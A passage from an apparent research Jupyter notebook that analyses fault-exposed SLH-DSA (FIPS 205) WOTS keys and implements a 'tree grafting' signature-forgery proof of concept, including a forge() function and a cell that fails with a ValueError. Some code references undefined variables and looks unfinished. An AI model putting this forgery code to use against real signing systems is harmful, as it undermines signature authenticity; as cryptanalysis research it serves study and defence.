    "def score(key: fips205.WOTSKeyData) -> int:\n",
    "    return sum(slh.w - c for c in key.chains_calculated)\n",
    "most_exposed_adrs, most_exposed_key = max(\n",
    "    joined_sigs.items(),\n",
    "    key=lambda item: score(item[1]))\n",
    "print(\"Key with most exposed chains (score: {}):\".format(\n",
    "    score(most_exposed_key)\n",
    "))\n",
    "print_adrs(most_exposed_adrs, verbose=True)\n",
    "print_key_data(most_exposed_key, most_exposed_adrs, pk_seed, None)\n",
    "\n",
    "print(\"=\"*64)\n",
    "print(\"All keys for exposed address:\")\n",
    "print_adrs(most_exposed_adrs, verbose=True)\n",
    "for key in groups[most_exposed_adrs]:\n",
    "    print_key_data(key, most_exposed_adrs, pk_seed, valid_sigs[most_exposed_adrs])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "14dc8602",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fraction of signable messages: 1.0\n",
      "Expected number of repetitions until a valid signature is found: 2**0.0\n"
     ]
    }
   ],
   "source": [
    "# calculate number of signinable messages (without checksum)\n",
    "import math\n",
    "\n",
    "\n",
    "def num_signable_messages(key: fips205.WOTSKeyData) -> int:\n",
    "    num_sign = 1\n",
    "    for i in range(slh.len1):\n",
    "        if key.chains_calculated[i] < slh.w - 1:\n",
    "            num_sign *= (slh.w - 1 - key.chains_calculated[i])\n",
    "    return num_sign/((slh.w-1)**slh.len1)\n",
    "num_signable = num_signable_messages(most_exposed_key)\n",
    "expected_reps = 1/num_signable\n",
    "print(f\"Fraction of signable messages: {num_signable}\")\n",
    "print(f\"Expected number of repetitions until a valid signature is found: 2**{math.log2(expected_reps)}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "4a6cef1e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# sign a random message with the exposed key\n",
    "#msg = bytes.fromhex('bc9c6c7892ac9aa558a7ee5ef40a50bed3796a3cc657e88c6cedec7ddffbdad2')\n",
    "#assert most_exposed_key.try_sign(msg, most_exposed_adrs, pk_seed, params)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c70dca9",
   "metadata": {},
   "source": [
    "# Tree Grafting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "35878c3a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<module 'cryptanalysis_lib' from '/home/jb/rowhammer-jb/bs-poc/tools/cryptanalysis_lib.py'>"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import cryptanalysis_lib as clib\n",
    "import importlib\n",
    "importlib.reload(clib)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "cd56ecb9",
   "metadata": {},
   "outputs": [],
   "source": [
    "#%timeit clib.sign_worker((1, most_exposed_adrs, most_exposed_key, pk_seed, params))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "98254039",
   "metadata": {},
   "outputs": [],
   "source": [
    "#%timeit clib.sign_worker_xmss((1, most_exposed_adrs, most_exposed_key, pk_seed, params))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "f9bc4511",
   "metadata": {},
   "outputs": [],
   "source": [
    "#%timeit clib.sign_worker_xmss_c((1, most_exposed_adrs, most_exposed_key, pk_seed, params))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "10acdae2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Signing 10 messages\n",
      "Total messages per process: 4\n"
     ]
    },
    {
     "ename": "ValueError",
     "evalue": "not enough values to unpack (expected 4, got 3)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[31], line 42\u001b[0m\n\u001b[1;32m     39\u001b[0m num_sigs \u001b[38;5;241m=\u001b[39m \u001b[38;5;241m10\u001b[39m\n\u001b[1;32m     41\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mSigning \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mnum_sigs\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m messages\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m---> 42\u001b[0m xmss_pk, adrs, sk_seed, key  \u001b[38;5;241m=\u001b[39m sign_message_batch_mp(num_sigs, most_exposed_adrs, most_exposed_key, pk_seed, params, num_procs\u001b[38;5;241m=\u001b[39mcpu_count()\u001b[38;5;241m-\u001b[39m\u001b[38;5;241m1\u001b[39m)\n\u001b[1;32m     43\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mSuccessfully grafted tree for XMSS PK \u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m+\u001b[39m xmss_pk\u001b[38;5;241m.\u001b[39mhex())\n\u001b[1;32m     44\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAddress\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n",
      "\u001b[0;31mValueError\u001b[0m: not enough values to unpack (expected 4, got 3)"
     ]
    }
   ],
   "source": [
    "import math\n",
    "from multiprocessing import Pool\n",
    "from os import cpu_count\n",
    "\n",
    "import concurrent\n",
    "\n",
    "def sign_message_batch_mp(total_msgs, adrs, key, pk_seed, params, num_procs=None):\n",
    "    \"\"\"\n",
    "    Use a process pool to sign `total_msgs` messages *per* (adrs,key).\n",
    "    Returns the first successful message signed by any process.\n",
    "    \"\"\"\n",
    "    if num_procs is None:\n",
    "        num_procs = cpu_count()\n",
    "\n",
    "    # Split total_msgs into roughly equal chunks per process\n",
    "    per_proc = math.ceil(total_msgs / num_procs)\n",
    "    print(\"Total messages per process:\", per_proc)\n",
    "\n",
    "    # Build one work item per (process x key)\n",
    "    work = [(per_proc, adrs.copy(), key, pk_seed, params) for _ in range(num_procs)]\n",
    "    \n",
    "    with concurrent.futures.ProcessPoolExecutor() as executor:\n",
    "        futures = {executor.submit(clib.sign_worker_xmss_c, work): work for work in work}\n",
    "        \n",
    "        for future in concurrent.futures.as_completed(futures):\n",
    "            try:\n",
    "                result = future.result()\n",
    "                if result:\n",
    "                    # Cancel all other futures\n",
    "                    for f in futures:\n",
    "                        f.cancel()\n",
    "                    return result\n",
    "            except Exception as e:\n",
    "                print(\"Error:\", e)\n",
    "    return None\n",
    "\n",
    "if expected_reps > 2**29:\n",
    "    raise ValueError(\"Expected repetitions are too high, aborting\")\n",
    "num_sigs = 10\n",
    "\n",
    "print(f\"Signing {num_sigs} messages\")\n",
    "xmss_pk, adrs, sk_seed, key  = sign_message_batch_mp(num_sigs, most_exposed_adrs, most_exposed_key, pk_seed, params, num_procs=cpu_count()-1)\n",
    "print(\"Successfully grafted tree for XMSS PK \" + xmss_pk.hex())\n",
    "print(\"Address\")\n",
    "print_adrs(adrs, verbose=True)\n",
    "print(\"SK seed:\", sk_seed.hex())\n",
    "print(\"PK seed:\", pk_seed.hex())\n",
    "print(\"Key:\", key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f34864ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "import importlib\n",
    "importlib.reload(fips205)\n",
    "\n",
    "def forge(valid_sig: bytes, sk: bytes, pk: bytes, adrs: fips205.ADRS, key: fips205.WOTSKeyData, m: bytes, params: str):\n",
    "    slh = fips205.SLH_DSA(params)\n",
    "    pk_seed = pk[:slh.n]\n",
    "    pk_root = pk[slh.n:]\n",
    "    top_part = valid_sig[n + fors_bytes + (d-1) * (wots_bytes + xmss_bytes) + wots_bytes:n + fors_bytes + d * (wots_bytes + xmss_bytes)]\n",
    "    forged_sig = None\n",
    "    # find a randomization value R that matches the adrs of the exposed key\n",
    "    addrnd = None\n",
    "    while not addrnd:\n",
    "        addrnd = os.urandom(32)\n",
    "        digest  = slh.h_msg(addrnd, pk_seed, pk_root, m)\n",
    "        (_, i_tree, i_leaf) = slh.split_digest(digest)\n",
    "        hp_m    = ((1 << slh.hp) - 1)\n",
    "        for i in range(1, target_layer-1):\n",
    "            i_leaf = i_tree & hp_m  # i_leaf = i_tree mod 2^h'\n",
    "            i_tree  =   i_tree >> slh.hp  # i_tree >> h'\n",
    "        if i_leaf != adrs.get_layer_address():\n",
    "            #print(f\"Leaf index {i_leaf} in layer {target_layer} does not match target index {adrs.get_key_pair_address()}, retrying...\")\n",
    "            addrnd = None\n",
    "            continue\n",
    "    while not forged_sig:\n",
    "        bottom_part, root = slh.slh_sign_internal(m, sk, addrnd, stop_at=target_layer-1)\n",
    "        pk_seed = pk[:slh.n]\n",
    "        forged_sig = key.try_sign(root, adrs, pk_seed, params)\n",
    "    print(len(bottom_part))\n",
    "    print(len(forged_sig))\n",
    "    print(len(top_part))\n",
    "    return bottom_part + forged_sig + top_part\n",
    "\n",
    "sk_prf = os.urandom(32)\n",
    "_, sk = slh.slh_keygen_internal(sk_seed, sk_prf, pk_seed, params)\n",
    "valid_sig = next(key for key in groups[most_exposed_adrs] if key.valid)\n",
    "\n",
    "wots_bytes = slh.len * n\n",
    "xmss_bytes = hp * n\n",
    "fors_bytes = k * (n + a * n)\n",
    "sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "valid_sig = sigs[valid_sig.sig_idx]\n",
    "m = valid_sig[sig_len:]\n",
    "valid_sig = valid_sig[:sig_len]\n",
    "\n",
    "print(f'verifying message \"{m.decode()}\" with valid signature')\n",
    "suc = slh.slh_verify_internal(m, valid_sig, pk, params)\n",
    "print(\"Signature verification result:\", suc)\n",
    "\n",
    "print(f'Signining message \"{m.decode()}\" with compromised key')\n",
    "sig = forge(valid_sig, sk, pk, most_exposed_adrs, most_exposed_key, m, params)\n",
    "print(f'verifying message \"{m.decode()}\" with forged signature')\n",
    "suc = slh.slh_verify_internal(m, sig, pk, params)\n",
    "print(\"Signature verification result:\", suc)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
